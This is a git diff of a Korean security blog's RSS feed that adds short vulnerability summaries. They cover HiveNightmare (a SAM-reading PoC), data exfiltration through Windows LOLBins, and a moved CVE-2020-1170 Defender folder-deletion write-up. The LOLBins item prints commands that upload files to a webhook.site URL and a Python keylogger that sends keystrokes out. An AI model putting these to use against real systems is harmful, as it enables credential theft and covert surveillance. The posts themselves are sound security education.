@@ -9,8 +9,79 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Wed, 21 Jul 2021 11:41:22 GMT</pubDate>
+    <pubDate>Fri, 23 Jul 2021 04:34:45 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] HiveNightmare aka SeriousSAM — anybody can read the registry in Windows 10</title>
+      <link>https://hackyboiz.github.io/2021/07/23/j0ker/2021-07-16-23/</link>
+      <guid>https://hackyboiz.github.io/2021/07/23/j0ker/2021-07-16-23/</guid>
+      <pubDate>Fri, 23 Jul 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://doublepulsar.com/hivenightmare-aka-seriouss</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5">https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC5D0;&#xC11C; Shadow Volume&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xB54C;, Shadow Copy&#xC744; &#xD1B5;&#xD574; &#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">hFile = CreateFile(TEXT(&#x201C;\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SAM&#x201D;),GENERIC_READ, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);</code></pre><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xD655;&#xD55C; &#xC6D0;&#xC778;&#xC740; &#xBD84;&#xC11D;&#xB418;&#xACE0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; SAM &#xD30C;&#xC77C;&#xC5D0; &#xC788;&#xB294; BUILTIN\Users&#xC758; &#xC77D;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xBE8C;&#xC73C;&#xB85C;&#xC368; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; CVE-2021-36934&#xB97C; &#xD560;&#xB2F9; &#xBC1B;&#xACE0; &#xD328;&#xCE58; &#xC9C4;&#xD589; &#xC911;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/sam/">sam</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/hivenightmare/">hivenightmare</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/serioussam/">serioussam</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/registry/">registry</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/07/23/j0ker/2021-07-16-23/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Data Exfiltration with LOLBins</title>
+      <link>https://hackyboiz.github.io/2021/07/22/idioth/2021-07-22/</link>
+      <guid>https://hackyboiz.github.io/2021/07/22/idioth/2021-07-22/</guid>
+      <pubDate>Thu, 22 Jul 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://debugactiveprocess.medium.com/data-exfiltration-w</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf">Data Exfiltration with LOLBins</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Living off the land (LOL)&#xC740; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBBF8;&#xB9AC; &#xC124;&#xCE58;&#xB41C; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC804;&#xD30C;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. LOL&#xC5D0;&#xB294; Windows &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xD589;&#xC704;&#xB97C; &#xC228;&#xAE30;&#xB294; LOLBins, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLLibs, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; LOLScripts &#xB4F1;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xC220;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. LOL&#xC5D0; &#xAD00;&#xD55C; &#xB9CE;&#xC740; &#xD2B8;&#xB9AD;&#xB4E4;&#xC740; <a href="https://lolbas-project.github.io/">LOLBAS &#xD504;&#xB85C;&#xC81D;&#xD2B8;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Microsoft Windows Defender&#xC758; <code>ConfigSecurityPolicy.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs subunit">ConfigSecurityPolicy.exe C:\temp\config.xml &quot;https://webhook.site/4bce19be<span class="hljs-string">-2642</span><span class="hljs-string">-4</span>f76<span class="hljs-string">-9</span>e8e<span class="hljs-string">-7</span>aea1448322d?sensitive_data&quot;</code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>webhook.site</code>&#xC5D0; <code>C:\temp\config.xml</code> &#xD30C;&#xC77C;&#xC774; <code>sensitive_data</code> &#xD30C;&#xC77C;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD6C4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; .NET Framework development environment&#xC5D0;&#xC11C; &#xC6F9; &#xC11C;&#xBC84; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; Microsoft Web Services Description Language Utility&#xC778; <code>wsdl.exe</code>&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">wsdl</span>.exe /server ttps://webhook.site/<span class="hljs-number">4</span>bce<span class="hljs-number">19</span>be-<span class="hljs-number">2642</span>-<span class="hljs-number">4</span>f<span class="hljs-number">76</span>-<span class="hljs-number">9</span>e<span class="hljs-number">8</span>e-<span class="hljs-number">7</span>aea<span class="hljs-number">1448322</span>d?sensitive_data</code></pre><p>&#xD574;&#xB2F9; LOLBins&#xB97C; &#xD1B5;&#xD574; Windows defender&#xC758; &#xB85C;&#xADF8;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xD0A4;&#xB85C;&#xAE45;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-comment"># From: https://github.com/moses-palmer/pynput</span>from pynput.keyboard import Key, Listenerimport osimport sysimport subprocessURL = <span class="hljs-string">&apos;https://webhook.site/xxxxxx-xxxxx-xxxx-xxxxx-xxxxxxx&apos;</span>uploader = <span class="hljs-string">&quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe&quot;</span>content = <span class="hljs-string">&quot;&quot;</span>def on_press(key):    global content    global URL    global uploader    <span class="hljs-keyword">if</span> str(key) == <span class="hljs-string">&apos;Key.backspace&apos;</span>:        content += <span class="hljs-string">&apos; &apos;</span>    <span class="hljs-keyword">else</span>:        content += str(key)print(f<span class="hljs-string">&apos;last key: {str(key)}&apos;</span>)    print(<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-keyword">if</span> str(key) == <span class="hljs-string">&apos;Key.enter&apos;</span>:        upload_url = (f<span class="hljs-string">&apos;{URL}?{content}&apos;</span>)        subprocess.call([uploader, <span class="hljs-string">&apos;c:\\temp\\test.xml&apos;</span>, upload_url])        buffer = <span class="hljs-string">&apos;&apos;</span><span class="hljs-keyword">if</span> key == <span class="hljs-number">0</span>x03:        sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    try:        with Listener(on_press=on_press) as listener:            listener.join()    except (KeyboardInterrupt, SystemExit):        sys.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lolbins/">lolbins</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/data-exfiltration/">data exfiltration</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/07/22/idioth/2021-07-22/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Research] 핵린이의 angr 정복기 - (2) Symbolic Execution</title>
@@ -175,13 +246,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
-      
       <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
       
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
       <category domain="https://hackyboiz.github.io/tags/token/">token</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
       
       <category domain="https://hackyboiz.github.io/tags/createprocesswithlogon/">createprocesswithlogon</category>
       
@@ -243,11 +314,11 @@
       <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
       <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
       
       <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
@@ -317,11 +388,11 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
       
       <category domain="https://hackyboiz.github.io/tags/conflict/">conflict</category>
       
@@ -421,9 +492,9 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
       <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
       
       <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
       
@@ -493,11 +564,11 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
       <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
@@ -543,6 +614,45 @@
     </item>
     
     <item>
+      <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
+      <link>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</link>
+      <guid>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</guid>
+      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://itm4n.github.io/cve-2020-1170-windows-defen</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;, <code>MpCmdRun.log</code>&#xC640; <code>MpSigStub.log</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC774; &#xB458; &#xBAA8;&#xB450; <code>C:\Windows\Temp</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB450; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; Write &#xAD8C;&#xD55C;&#xC740; &#xC5C6;&#xC9C0;&#xB9CC; <code>C:\Windows\Temp</code>&#xC5D0; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xB85C;&#xADF8; &#xD30C;&#xC77C; &#xC911; <code>MpCmdRun.log</code> &#xD30C;&#xC77C;&#xC774; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xBA74;, Windows Defender&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; <code>MpCmdRum.log.bak</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>MpCmdRun.log.bak</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xD3F4;&#xB354;&#xB77C;&#xBA74;, &#xD3F4;&#xB354; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xACFC; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xC6D0;&#xD558;&#xB294; <code>MpCmdRun.log.bak</code>&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xD3F4;&#xB354;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Junction &#xD3F4;&#xB354;&#xB97C; <code>C:\Windows\Temp</code>&#xC5D0; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; 40&#xBD84; &#xB3D9;&#xC548; &#xBB34;&#xD55C;&#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD558;&#xC5EC; <code>MpCmdRun.log</code>&#xAC00; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xAC8C; &#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354; &#xBC0F; &#xADF8; &#xC544;&#xB798; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC9C0;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/file-deletion/">file_deletion</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/directory-deletion/">directory_deletion</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
       <title>[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</title>
       <link>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</link>
       <guid>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/</guid>
@@ -563,9 +673,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
       <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
       
@@ -575,45 +685,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
-      <link>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</link>
-      <guid>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/</guid>
-      <pubDate>Sun, 04 Jul 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://itm4n.github.io/cve-2020-1170-windows-defen</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;, <code>MpCmdRun.log</code>&#xC640; <code>MpSigStub.log</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC774; &#xB458; &#xBAA8;&#xB450; <code>C:\Windows\Temp</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB450; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; Write &#xAD8C;&#xD55C;&#xC740; &#xC5C6;&#xC9C0;&#xB9CC; <code>C:\Windows\Temp</code>&#xC5D0; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xB85C;&#xADF8; &#xD30C;&#xC77C; &#xC911; <code>MpCmdRun.log</code> &#xD30C;&#xC77C;&#xC774; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xBA74;, Windows Defender&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; <code>MpCmdRum.log.bak</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>MpCmdRun.log.bak</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xD3F4;&#xB354;&#xB77C;&#xBA74;, &#xD3F4;&#xB354; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xACFC; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xC6D0;&#xD558;&#xB294; <code>MpCmdRun.log.bak</code>&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xD3F4;&#xB354;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Junction &#xD3F4;&#xB354;&#xB97C; <code>C:\Windows\Temp</code>&#xC5D0; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; 40&#xBD84; &#xB3D9;&#xC548; &#xBB34;&#xD55C;&#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD558;&#xC5EC; <code>MpCmdRun.log</code>&#xAC00; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xAC8C; &#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354; &#xBC0F; &#xADF8; &#xC544;&#xB798; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC9C0;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/file-deletion/">file_deletion</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/directory-deletion/">directory_deletion</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/07/04/j0ker/2021-07-04/#disqus_thread</comments>
       
     </item>
     
@@ -648,78 +719,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] NETGEAR firmware 취약점</title>
-      <link>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</link>
-      <guid>https://hackyboiz.github.io/2021/07/02/idioth/2021-07-02/</guid>
-      <pubDate>Fri, 02 Jul 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2021/06/30/micros</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 &#xC2DC;&#xB9AC;&#xC988;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; NETGEAR DGN-2200v1 &#xC2DC;&#xB9AC;&#xC988; &#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBCF4;&#xC548;&#xC744; &#xC190;&#xC0C1;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; &#xC138; 